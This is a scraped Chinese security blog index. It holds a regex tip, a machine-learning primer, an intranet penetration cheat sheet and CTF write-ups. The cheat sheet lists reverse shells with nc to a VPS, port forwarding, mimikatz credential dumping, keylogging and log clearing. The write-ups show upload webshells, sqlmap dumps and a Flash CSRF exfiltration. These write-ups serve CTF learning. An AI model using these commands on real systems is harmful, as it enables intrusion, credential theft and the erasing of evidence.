提取页面超链接</strong></h2><p>提取html中的超链接。</p><pre><code>(&lt;a\\s*(?!.*\\brel=)[^&gt;]*)(href=&quot;https?:\\/\\/)((?!(?:(?:www\\.)?&#39;.implode(&#39;|(?:www\\.)?&#39;, $follow_list).&#39;))[^&quot;]+)&quot;((?!.*\\brel=)[^&gt;]*)(?:[^&gt;]*)&gt;</code></pre><h2 id="18-查找CSS属性"><a href="#18-查找CSS属性" class="headerlink" title="18. 查找CSS属性"></a><strong>18. 查找CSS属性</strong></h2><p>通过下面的表达式，可以搜索到相匹配的CSS属性。</p><pre><code>^\\s*[a-zA-Z\\-]+\\s*[:]{1}\\s[a-zA-Z0-9\\s.#]+[;]{1}</code></pre><h2 id="19-抽取注释"><a href="#19-抽取注释" class="headerlink" title="19. 抽取注释"></a><strong>19. 抽取注释</strong></h2><p>如果你需要移除HMTL中的注释，可以使用如下的表达式。</p><pre><code>&lt;!--(.*?)--&gt;</code></pre><h2 id="20-匹配HTML标签"><a href="#20-匹配HTML标签" class="headerlink" title="20. 匹配HTML标签"></a><strong>20. 匹配HTML标签</strong></h2><p>通过下面的表达式可以匹配出HTML中的标签属性。</p><pre><code class="regex">&lt;\\/?\\w+((\\s+\\w+(\\s*=\\s*(?:&quot;.*?&quot;|&#39;.*?&#39;|[\\^&#39;&quot;&gt;\\s]+))?)+\\s*|\\s*)\\/?&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>机器学习概念</title>
      <link href="/archis/d4eed376/"/>
      <url>/archis/d4eed376/</url>
      
        <content type="html"><![CDATA[<h1 id="机器学习概念"><a href="#机器学习概念" class="headerlink" title="机器学习概念"></a>机器学习概念</h1><h2 id="什么是机器学习"><a href="#什么是机器学习" class="headerlink" title="什么是机器学习"></a>什么是机器学习</h2><p>我们通常在计算机编程的时候，都是已知输入，然后通过一定的算法产生输出，如下图所示：</p><p><a href="http://blog.laiyum.site/uploads/18052801.jpg" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052801.jpg" alt="image"></a></p><p>而还有一种情况呢，我们知道了输入和输出，但是却不知道中间的算法，这时候就需要用机器学习通过观察输入输出来学习这个算法，我们叫做知识，然后用学到的知识通过新的输入来产生输出。简而言之<strong>机器学习是用来寻找输入输出间的映射关系的</strong><br><a href="http://blog.laiyum.site/uploads/18052802.jpg" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052802.jpg" alt="image"></a></p><p>其实我们人在学习思考时，脑子里也有这么个映射过程，当我们看到猫的图片，在脑子里产生了映射，于是乎，就说出了猫这个词，所以呢<strong>机器学习就是让计算机和人一样思考</strong></p><p><a href="http://blog.laiyum.site/uploads/18052803.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052803.png" alt="image"></a></p><h2 id="机器学习相关概念的区别"><a href="#机器学习相关概念的区别" class="headerlink" title="机器学习相关概念的区别"></a>机器学习相关概念的区别</h2><p>在谈到机器学习时，我们经常会听到下面几个概念：数据挖掘，人工智能等等，那他们之间有什么联系呢？我们先来看看下面的这幅图：</p><p><a href="http://blog.laiyum.site/uploads/18052808.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052808.png" alt="image"></a></p><p>也就是说机器学习是数据挖掘它们的底层，机器学习给它们提供算法，数据挖掘则是机器学习的应用。</p><h2 id="机器学习的应用"><a href="#机器学习的应用" class="headerlink" title="机器学习的应用"></a>机器学习的应用</h2><p>像我们熟知的Apple的faceID，google的AlphaGo，MicroSoft的小娜都是机器学习的典型应用</p><h2 id="机器学习方法"><a href="#机器学习方法" class="headerlink" title="机器学习方法"></a>机器学习方法</h2><p>实现机器学习有多种方法，这里方法是我们通常所说的算法，主要有下面几种：</p><h3 id="监督学习方法"><a href="#监督学习方法" class="headerlink" title="监督学习方法"></a>监督学习方法</h3><p>所谓监督学习方法就是说随便给一堆数据和数据对应的标签，计算机在学习之后能根据新的输入数据判断它们对应的标签。</p><p>举个例子，我们给计算机一大堆猫狗的图片，并告诉它，哪些是狗，哪些是猫，计算机学习之后，再给它看猫和狗的图片，它就能告诉我们哪些是狗，哪些是猫。</p><p><a href="http://blog.laiyum.site/uploads/18052804.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052804.png" alt="image"></a></p><p><a href="http://blog.laiyum.site/uploads/18052805.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052805.png" alt="image"></a></p><p>监督学习方法用于分类和回归，我们熟知的神经网络就是一种监督学习方法。</p><h3 id="非监督学习方法"><a href="#非监督学习方法" class="headerlink" title="非监督学习方法"></a>非监督学习方法</h3><p>我们有的时候只给计算机数据，不给计算机对应的标签，计算机能通过观察数据之间的规率进行数据归类<br>还是上面的例子，我们这次不告诉计算机哪些是狗，哪些是猫，计算机学习之后能把他们归类出来。</p><p><a href="http://blog.laiyum.site/uploads/18052806.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052806.png" alt="image"></a></p><p>非监督学习用于聚类，如k-means算法</p><h3 id="半监督学习方法"><a href="#半监督学习方法" class="headerlink" title="半监督学习方法"></a>半监督学习方法</h3><p>半监督学习方法综合了监督学习和非监督学习两种方法。在初始阶段给计算机一些有标签的数据和大量没有标签的数据，计算机学习后能进行归类<br>半监督学习用于训练更高效更准确的模型，因为它既避免了带标签的数据少而的模型过拟合，也减少了打标签的工作量。</p><h3 id="强化学习"><a href="#强化学习" class="headerlink" title="强化学习"></a>强化学习</h3><p>强化学习是学习一个最优策略，可以让本体在特定环境中，根据当前的状态，做出行动，从而获得最大奖励。</p><p>来个新例子，这次，我们让计算机打篮球，我们并不需要告诉计算机怎么打篮球，我们只需要给它个篮球，让它自己打，然后我们对计算机打分，进球分越高，打分越高，这里的打分就是上面的奖励，每次计算机要做的就是获得最大奖励，一开始，面对陌生的环境，计算机并不知道怎么进球，经过奖励刺激后，命中率就会越来越高。</p><p><a href="http://blog.laiyum.site/uploads/18052807.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052807.png" alt="image"></a></p><p>google的AlphaZero便是强化学习的典型应用</p><h3 id="遗传算法"><a href="#遗传算法" class="headerlink" title="遗传算法"></a>遗传算法</h3><p>模拟自然界优胜劣汰的进化现象，把搜索空间（问题解的组成空间）映射为遗传空间，把可能的解编码成一个向量——染色体，向量的每个元素称为基因。通过不断计算各染色体的适应值，选择最好的染色体，获得最优解。</p><p>还是拿上面的例子来说，先训练出两个打篮球的计算机ai，让这两个aic重组，变异产生后代种群，挑出最会打篮球的再进行重组变异，如此循环，每次挑出最强的</p>]]></content>
      
      
      <categories>
          
          <category> AiSecurity </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>浅谈内网渗透流程</title>
      <link href="/archis/17ef10d7/"/>
      <url>/archis/17ef10d7/</url>
      
        <content type="html"><![CDATA[<h1 id="浅谈内网渗透流程"><a href="#浅谈内网渗透流程" class="headerlink" title="浅谈内网渗透流程"></a>浅谈内网渗透流程</h1><h2 id="0x01-内网转发"><a href="#0x01-内网转发" class="headerlink" title="0x01 内网转发"></a>0x01 内网转发</h2><h3 id="lcx-内网端口转发"><a href="#lcx-内网端口转发" class="headerlink" title="lcx 内网端口转发"></a>lcx 内网端口转发</h3><p>Lcx内网端口转发<br>• lcx.exe -slave vps 3333 127.0.0.1 3389 //把主机的3389端口转发到vps的3333端口<br>• lcx.exe –listen 3333 4444 //监听3333端口，并将3333的请求转发给4444端口</p><p>本地端口转发<br>• Lcx.exe –tran 21 主机IP 3389 //将3389端口转发到21端口</p><p>通常时候内网的防火墙把3389端口ban了，无法作为端口转发出去，这个时候应该吧端口转发成21或者80端口，这些端口是有放行策略的，</p><h3 id="socks"><a href="#socks" class="headerlink" title="socks"></a>socks</h3><ul><li>Earthworm </li><li>Termite  //ew升级版 <a href="http://rootkiter.com/Termite/" target="_blank" rel="external">http://rootkiter.com/Termite/</a></li></ul><p>客户端执行：</p><pre><code>agent_windows_x86.exe -l  4444</code></pre><p>管理端执行：</p><pre><code>admin_windows_x86.exe -c 127.0.0.1 -p 4444</code></pre><p>将新的agent加入拓扑：</p><pre><code>agent_windows_x86.exe -c 127.0.0.1 -p 4444</code></pre><p>具体使用方法可参考： <a href="http://rootkiter.com/Termite/README.txt" target="_blank" rel="external">http://rootkiter.com/Termite/README.txt</a></p><ul><li><p>S5.py  //配合Proxifier一起使用</p></li><li><p>reGeorg //通过webshell 建立一个 socks 代理进行内网穿透</p><p>  s</p></li></ul><h3 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h3><p>反向连接<br>• nc -lvp 4444 //vps上执行<br>• nc -t -e cmd.exe vps 4444 //-t 参数是指通过telnet模式执行cmd.exe<br> 正向代理<br>• nc -l -p 4444 -t -e cmd.exe //vps上<br>• nc -vv vps 4444 //本地执行</p><h3 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h3><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议。</p><p>工具地址： <a href="https://github.com/fatedier/frp" target="_blank" rel="external">https://github.com/fatedier/frp</a></p><p><strong>frp 的作用</strong></p><p>利用处于内网或防火墙后的机器，对外网环境提供 http 或 https 服务。</p><p>对于 http, https 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。</p><p>利用处于内网或防火墙后的机器，对外网环境提供 tcp 和 udp 服务，例如在家里通过 ssh 访问处于公司内网环境内的主机。</p><p>启动frp服务器端：</p><pre><code>frps.exe -c frps.ini</code></pre><p>浏览器访问： 127.0.0.1：7500，输入frps.ini中配置的用户名和密码即可进入控制面板： </p><h3 id="ngrok"><a href="#ngrok" class="headerlink" title="ngrok"></a>ngrok</h3><p>这里仅简单演示下Windows平台上的使用：</p><p>首先在内网主机上执行（内网主机需安装Python）：</p><pre><code>python -m SimpleHTTPServer 8089</code></pre><p>我这里在Windows下用Python 2.7来演示，就执行：</p><pre><code>py -2 -m SimpleHTTPServer 8089</code></pre><p><a href="https://s9.postimg.cc/cghz3gapb/360_20180502231649460.jpg" target="_blank" rel="external"><img src="https://s9.postimg.cc/cghz3gapb/360_20180502231649460.jpg" alt="内网渗透之端口转发与代理"></a></p><p>将ngrok上传至内网主机并启动ngrok：</p><pre><code>ngrok.exe http 8089</code></pre><p><a href="https://s9.postimg.cc/7j4ei1ixb/360_20180502232222200.jpg" target="_blank" rel="external"><img src="https://s9.postimg.cc/7j4ei1ixb/360_20180502232222200.jpg" alt="内网渗透之端口转发与代理"></a></p><p>这时我们只需要在浏览器中访问：</p><pre><code>http://cdb0e21b.ngrok.io或者https://cdb0e21b.ngrok.io</code></pre><p>即可通过HTTP或者HTTPS来访问内网主机上的文件。</p><p>当然ngrok还有很多其他功能，更多使用方法请参考官方文档： <a href="https://ngrok.com/docs" target="_blank" rel="external">https://ngrok.com/docs</a></p><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><h3 id="域信息"><a href="#域信息" class="headerlink" title="域信息"></a>域信息</h3><p>query user || qwinsta 查看当前在线用户</p><p>net user  查看本机用户</p><p>net user /domain 查看域用户</p><p>net view &amp; net group “domain computers” /domain 查看当前域计算机列表 第二个查的更多</p><p>net view /domain 查看有几个域</p><p>net view \\dc   查看 dc 域内共享文件</p><p>net group /domain 查看域里面的组</p><p>net group “domain admins” /domain 查看域管</p><p>net localgroup administrators /domain   /这个也是查域管，是升级为域控时，本地账户也成为域管</p><p>net group “domain controllers” /domain 域控</p><p>net time /domain </p><p>net config workstation   当前登录域 - 计算机名 - 用户名</p><p>net use \\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源</p><p>ipconfig</p><p>systeminfo</p><p>tasklist /svc</p><p>tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklist</p><p>net localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组</p><p>netstat -ano</p><p>nltest /dclist:xx  查看域控</p><p>whoami /all 查看 Mandatory Label uac 级别和 sid 号</p><p>net sessoin 查看远程连接 session (需要管理权限)</p><p>net share     共享目录</p><p>cmdkey /l   查看保存登陆凭证</p><p>echo %logonserver%  查看登陆域</p><p>spn –l administrator spn 记录</p><p>set  环境变量</p><p>dsquery server - 查找目录中的 AD DC/LDS 实例</p><p>dsquery user - 查找目录中的用户</p><p>dsquery computer 查询所有计算机名称 windows 2003</p><p>dir /s *.exe 查找指定目录下及子目录下没隐藏文件</p><p>arp -a</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>Windows密码 //收集管理员信息</p><p>mimikatz.exe </p><p>privilege::debug</p><p>sekurlsa::logonpasswords</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806221754_957.png" alt=""></p><p>破解lm密码使用：<a href="http://www/object_security.ch/en/opcrack.php" target="_blank" rel="external">http://www/object_security.ch/en/opcrack.php</a></p><p> token::elevate</p><p> lsadump::sam</p><p> lsadump::secrets </p><p>exit </p><p> wifi 密码： </p><p>• Mysql等数据库密码 </p><p>• 浏览器保存密码</p><p> • 浏览器历史记录</p><p> • 远程桌面历史记录</p><p> • 查找文件</p><p> • 键盘记录</p><p>keyscan_start</p><p>keyscan_dump</p><p> • 中间人</p><h2 id="0x03-横向移动"><a href="#0x03-横向移动" class="headerlink" title="0x03 横向移动"></a>0x03 横向移动</h2><p> • 端口扫描</p><p> • 命令执行</p><p> • SQL注入</p><p> • 文件上传 </p><p>• 密码爆破</p><p> • 各类CVE </p><h2 id="0x04-收尾工程"><a href="#0x04-收尾工程" class="headerlink" title="0x04 收尾工程"></a>0x04 收尾工程</h2><p>痕迹清理 </p><p>系统日志 //%systemroot%system32configSecEvent.EVT<br>• 应用程序日志 //%systemroot%system32configAppEvent.EVT<br>• FTP日志 //%systemroot%system32logfilesmsftpsvc1<br>• WWW日志 //%systemroot%system32logfilesw3svc1</p><p>参考文章</p><p><a href="http://www.freebuf.com/articles/web/170970.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/170970.html</a></p><p><a href="https://mp.weixin.qq.com/s/U2MqcjA_YmMlajJzvDCZZw" target="_blank" rel="external">https://mp.weixin.qq.com/s/U2MqcjA_YmMlajJzvDCZZw</a></p><p><a href="https://www.anquanke.com/post/id/92646" target="_blank" rel="external">https://www.anquanke.com/post/id/92646</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>安恒5月</title>
      <link href="/archis/18042369/"/>
      <url>/archis/18042369/</url>
      
        <content type="html"><![CDATA[<h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><p>题目</p><pre><code>大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。</code></pre><p>题目给了代码</p><pre><code>&lt;?php highlight_file(__FILE__); ini_set(&quot;display_error&quot;, false);  error_reporting(0);  $str = isset($_GET[&#39;A_A&#39;])?$_GET[&#39;A_A&#39;]:&#39;A_A&#39;; if (strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;A_A&quot;) !==false) {     echo &#39;A_A,have fun&#39;; } elseif ($str&lt;9999999999) {     echo &#39;A_A,too small&#39;; } elseif ((string)$str&gt;0) {     echo &#39;A_A,too big&#39;; } else{     echo file_get_contents(&#39;flag.php&#39;); } ?&gt;</code></pre><p>首先第一个if判断，可以用<code>urlencode</code>绕过</p><p>然后我们需要知道php中的这样一个特性</p><pre><code>php &gt; var_dump([]&gt;9999999999);bool(true)php &gt; var_dump((string)[]&gt;0);bool(false)</code></pre><p>在php中，数组<code>[]</code>大于任何一个数</p><p>这样就可以成功绕过验证了</p><p><code>php -r &quot;var_dump([]&gt;233333333);&quot;</code></p><p>true</p><p><a href="http://101.71.29.5:10007/?A+A[]=admin" target="_blank" rel="external">http://101.71.29.5:10007/?A+A[]=admin</a></p><p>这里有个坑，flag被注释了，需要查看源代码才能看得到flag</p><pre><code>flag={09bc24026c987ae44a6e424479b2e3}</code></pre><h2 id="Mynote"><a href="#Mynote" class="headerlink" title="Mynote"></a>Mynote</h2><p>这道题目一开始我死扣xss发现无路可循后面经别人小小提醒之后，原来是个炒鸡弱智的反序列化题目，不多说<br>上图，在<code>robots.txt</code>里面发现几个可疑的页面，可能有用先记录着，直接访问<code>flag.php</code>是个假的flag。</p><p>经过别人的提示，是反序列化以后，多抓几个包看一下  在<code>upload页面</code>上传图片文件，然后返回查看图片的页面发现里面多了一个关于<code>picture</code>参数的<code>cookie</code> </p><p>解码发现是个<code>json格式</code>的东西 </p><p>这就跟反序列化联系起来了，这是一个数组类型的反序列化但直接反序列化会有报错，如下<br><img src="https://s1.ax1x.com/2018/06/23/P9MK5F.png" alt="P9MK5F.png"><br>发现是在当前目录用的函数读取页面，于是就要目录穿越一波，于是便有了下面的操作</p><pre><code class="php">&lt;?php $a[] = &#39;../../controllers/Basecontrol.php&#39;; $b[] = &#39;../../flag.php&#39;; $c[] = &#39;../../controllers/User.php&#39;; $d[] = &#39;../../controllers/Controllers.php.php&#39;;echo urlencode(base64_encode(serialize($a)));12345678</code></pre><p>把他们一个个弄到<code>picture</code>的<code>cookie</code>里面，把回显出来的<code>base64编码</code>一遍遍解码，得到源码，起初一直以为后续还要代码审计。。。结果解码flag.php的源码的时候出现了真的<code>flag</code>。。。。。尼玛坑爹，都做好审计准备了</p><pre><code class="php">&lt;?php$flag = &quot;flag{N4me_sPac4_Is_Int3r3st1ng}&quot;;echo &quot;flag{This_1S_A_F4ke_f1aG}&quot;;1234</code></pre><h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p>本题是一个中规中矩的文件上传漏洞.</p><p>打开题目链接，我们先上传一个图片文件.上传成功，回显图片的路径.</p><p>继续上传一个php文件，便发现提示It is not a image,上传失败.</p><p>我们抓包分析一下，修改Content-Type: image/jpeg，和文件后缀，还是不能上传php文件.</p><p>想到还有一种检测文件的方法，那就是文件头标志.</p><p>于是我上传了一个图片木马，即php木马隐藏在图片中,抓包，修改文件后缀名,上传成功，但是文件后缀名被改为peg</p><p>经过一番测试，发现它是自动将文件的三位后缀名替换为peg. 我们将文件名改成mu.jpg.php,上传成功，网站打开发现，mu.peg.php 解析成功. 这考虑的是apache的特性 从后往前识别</p><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808211643_505.png" alt=""></p><p>连接菜刀，拿到flag.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>安恒7月</title>
      <link href="/archis/b20debe2/"/>
      <url>/archis/b20debe2/</url>
      
        <content type="html"><![CDATA[<h1 id="安恒杯7月"><a href="#安恒杯7月" class="headerlink" title="安恒杯7月"></a>安恒杯7月</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="0x00-order"><a href="#0x00-order" class="headerlink" title="0x00 order"></a>0x00 order</h3><p>提示</p><p>1.右键提示 从flag表中得到flag</p><p>2.order注入</p><p>只对某一参数注入</p><p>sqlmap -u “<a href="http://101.71.29.5:10000/?order=id&amp;button=submit”" target="_blank" rel="external">http://101.71.29.5:10000/?order=id&amp;button=submit”</a> -p order</p><p>sqlmap -u “<a href="http://101.71.29.5:10000/?order=id&amp;button=submit”" target="_blank" rel="external">http://101.71.29.5:10000/?order=id&amp;button=submit”</a> -p order –dbs</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807261044_138.png" alt=""></p><p>sqlmap -u “<a href="http://101.71.29.5:10000/?order=id&amp;button=submit”" target="_blank" rel="external">http://101.71.29.5:10000/?order=id&amp;button=submit”</a> -p order –dbs –dump-all –thread 10</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807261613_856.png" alt=""></p><p>flag{666_0rdorby_you_can}</p><h3 id="0x01-就这么直接"><a href="#0x01-就这么直接" class="headerlink" title="0x01 就这么直接"></a>0x01 就这么直接</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807221514_920.png" alt=""></p><p>提交查询页面跳转到 我觉得这并不是答案</p><p>右键源码得到 hint.php</p><p>访问得到代码</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807211925_710.png" alt=""></p><p>分析：</p><p>1.访问页面的时间戳作为播种时间 </p><p>2.输出md5</p><p>php -r “echo md5(time());”</p><p>随机抽取一个md5的值输入进去</p><p>php -r “echo md(time());”</p><p>返回 答案错误</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807211928_659.png" alt=""></p><pre><code class="python">import requestsimport reimport ioimport sysurl=&quot;http:&quot;s=requests.Session()p=s.get(url)s.encoding = &#39;utf-8&#39;payload={&#39;answer&#39;:&#39;c4ca4238a0b923820dcc509a6f75849b&#39;}q=s.post(url,data=payload)html=q.contenthtml_doc=str(html,&#39;utf-8&#39;)payload={&#39;answer&#39;:html_doc[160:192]}#返回的md5值q=s.post(url,data=payload)html=q.contenthtml_doc=str(html,&#39;utf-8&#39;)print(html_doc)</code></pre><p>flag{ef58f0b1e9437b4451248fb3f239622b}</p><h3 id="0x02简历来了"><a href="#0x02简历来了" class="headerlink" title="0x02简历来了"></a>0x02简历来了</h3><p>当时没做出来 再次复现的</p><p>题目的知识点：</p><p>1、csrf的原理</p><p>2、swf的文件头flash的检查</p><p>cws fws zws</p><h4 id="解析："><a href="#解析：" class="headerlink" title="解析："></a>解析：</h4><p>上传简历</p><p>php代码审计：</p><p>直接提交访问</p><pre><code class="php">&lt;?phprequire_once(&#39;init.php&#39;);header(&quot;Content-type: text/html; charset=utf-8&quot;);if(isset($_POST[&#39;submit&#39;])){    if(!z_validate_captcha()){        die(&#39;验证码错误&#39;);    }    $email = isset($_POST[&#39;email&#39;])?trim($_POST[&#39;email&#39;]):&#39;&#39;;    $url = isset($_POST[&#39;url&#39;])?trim($_POST[&#39;url&#39;]):&#39;&#39;;    $file = isset($_FILES[&#39;file&#39;])?$_FILES[&#39;file&#39;]:false;    if($email == false || $url == false || $file == false){        die(&#39;Invalid Input&#39;);    }    if(!filter_var($email, FILTER_VALIDATE_EMAIL)){        die(&#39;Invalid Email&#39;);    }    if(!filter_var($url, FILTER_VALIDATE_URL) || (strpos($url, &#39;http://&#39;) !== 0 &amp;&amp; strpos($url, &#39;https://&#39;) !== 0)){        die(&#39;Invalid URL&#39;);    }    if($file[&#39;error&#39;] || $file[&#39;size&#39;] &gt; 1024*1024 || !is_uploaded_file($file[&#39;tmp_name&#39;])){        die(&#39;Invalid File&#39;);    }    $ext = getExt($file[&#39;name&#39;]);    if(!in_array($ext, array(&#39;.jpg&#39;,&#39;.jpeg&#39;, &#39;.png&#39;, &#39;.docx&#39;, &#39;.doc&#39;))){        die(&#39;Invalid File Type&#39;);    }    $file_checked = false;    if(in_array($ext, array(&#39;.jpg&#39;,&#39;.jpeg&#39;, &#39;.png&#39;))){        $finfo = finfo_open(FILEINFO_MIME);        if (!$finfo) {            die(&quot;Opening fileinfo database failed&quot;);        }        $mime = finfo_file($finfo, $file[&quot;tmp_name&quot;]);        finfo_close($finfo);        if($mime == false){            die(&#39;Invalid Filename&#39;);        }        $arr = explode(&#39;;&#39;, $mime);        $mime = $arr[0];        if($mime == false || !in_array($mime, array(&#39;image/gif&#39;, &#39;image/jpeg&#39;, &#39;image/jpg&#39;, &#39;image/png&#39;, &#39;application/octet-stream&#39;))){            die(&#39;Invalid Filename&#39;);        }else{            $file_checked = true;        }    }elseif(in_array($ext, array(&#39;.docx&#39;, &#39;.doc&#39;))){        $finfo = finfo_open(FILEINFO_MIME);        if (!$finfo) {            die(&quot;Opening fileinfo database failed&quot;);        }        $mime = finfo_file($finfo, $file[&quot;tmp_name&quot;]);        finfo_close($finfo);        if($mime == false){            die(&#39;Invalid Filename&#39;);        }        $arr = explode(&#39;;&#39;, $mime);        $mime = $arr[0];        if($mime == false || !in_array($mime, array(&#39;application/msword&#39;,&#39;application/word&#39;, &#39;application/vnd.openxmlformats-officedocument.wordprocessingml.document&#39;))){            die(&#39;Invalid Filename&#39;);        }else{            $file_checked = true;        }    }    if($file_checked !== true){        die(&#39;Invalid File Type&#39;);    }    $filename = &#39;./upload/&#39;.md5(mt_rand().microtime()).$ext;    move_uploaded_file($file[&quot;tmp_name&quot;], $filename);    if(!file_exists($filename)){        echo &#39;上传失败&#39;;    }else{        save_resume($email, $url, $filename);        echo &quot;&lt;br/&gt;提交成功：&quot;;        echo &quot;&lt;br/&gt;邮箱：&quot;.htmlspecialchars($email);        echo &quot;&lt;br/&gt;个人网站：&quot;.htmlspecialchars($url);        echo &quot;&lt;br/&gt;简历地址：&quot;.htmlspecialchars($filename);        echo &quot;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&quot;;    }}show_source(__FILE__);</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807271711_417.png" alt=""></p><p><a href="http://101.71.29.5:10001/admin/index.php" target="_blank" rel="external">http://101.71.29.5:10001/admin/index.php</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807271711_670.png" alt=""></p><p>考虑知识点csrf 我们要模拟管理员去访问</p><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p><a href="http://www.freebuf.com/articles/web/35353.html" target="_blank" rel="external">Flash跨域数据劫持漏洞，一大波网站受影响</a><br><strong>object标签在包含flash文件时没有对嵌入的文件后缀进行判断。也就是说，只要文件内容包含了正常的flash文件代码，就能够被object标签成功加载并执行。</strong></p><p>flash文件有三种文件头：CWS FWS ZWS【最新的】<br>由于ZWS是新兴的文件格式，PHP暂不支持。</p><p>在php中，当解析cws,fws格式的文件的时候，会解析成 application/x-shockwave-flash;<br>但是当解析 zws 格式的文件时候，会解析成 application/octet-stream<br>从而绕过MIME限制。</p><p><strong>目录扫描发现<a href="http://101.71.29.5:10001/admin/中需要管理员权限才能看到flag。我们已知后台的爬虫会带着管理员的session_id来打开flag的页面，当后台的爬虫打开这个图像的时候。会跳转到我们的服务器地址，与此同时会加载object标签内嵌的flash，flash会利用CSRF打开http://101.71.29.5:10001/admin/将flag打回我们的服务器。" target="_blank" rel="external">http://101.71.29.5:10001/admin/中需要管理员权限才能看到flag。我们已知后台的爬虫会带着管理员的session_id来打开flag的页面，当后台的爬虫打开这个图像的时候。会跳转到我们的服务器地址，与此同时会加载object标签内嵌的flash，flash会利用CSRF打开http://101.71.29.5:10001/admin/将flag打回我们的服务器。</a></strong></p><h6 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h6><p><strong>其实这道题原理是最重要的，复现的话利用的是别人写的东西，没有什么太大意义。</strong></p><p>下载项目中的文件，将<code>ContentHijacking.swf</code>文件头改为ZWS然后后缀改为jpg上传到服务器，记录文件路径。<strong>(windows编辑器改的文件不能复现成功，某表哥说他windows上我软件全试过，没用。只有mac的hex friend可以，这就很奇怪了。)</strong></p><p>然后在<code>ContentHijackingLoader.html</code>125行加上你vps的地址，保存传到你的vps上。<br><a href="https://upload-images.jianshu.io/upload_images/9113969-bc47b3e7e188f0de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" target="_blank" rel="external"><img src="https://upload-images.jianshu.io/upload_images/9113969-bc47b3e7e188f0de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></a></p><p>在你的vps上打开<code>ContentHijackingLoader.html</code>，第一个填写开始时候上传的jpg文件地址，下面填写要攻击的URL地址。然后生成payload。<br><a href="https://upload-images.jianshu.io/upload_images/9113969-a9a778bfc1351f30.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" target="_blank" rel="external"><img src="https://upload-images.jianshu.io/upload_images/9113969-a9a778bfc1351f30.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></a></p><p>把payload写进个人网站提交，后台爬虫会访问这个payload。然后在你的vps日志里面就能看到打回来的<a href="http://101.71.29.5:10001/admin/%E4%B8%AD%E7%9A%84flag%E3%80%82" target="_blank" rel="external">http://101.71.29.5:10001/admin/中的flag。</a><br><a href="https://upload-images.jianshu.io/upload_images/9113969-becf6d50182c16e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" target="_blank" rel="external"><img src="https://upload-images.jianshu.io/upload_images/9113969-becf6d50182c16e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x00-F5刷新"><a href="#0x00-F5刷新" class="headerlink" title="0x00 F5刷新"></a>0x00 F5刷新</h3><p>拿到一个图片一闪而过</p><p>根据提示想到F5刷新隐写</p><pre><code>首先下载F5解密的代码：https://github.com/matthewgao/F5-steganography切换到改目录下：cd F5-steganography继续运行命令：java Extract  E:\CTF\安恒月赛7\5b51807ba55b4\Misc.jpg然后会生成output.txt文件</code></pre><p>有密码</p><p>使用zipcenop打开看看可以解密</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807261455_536.png" 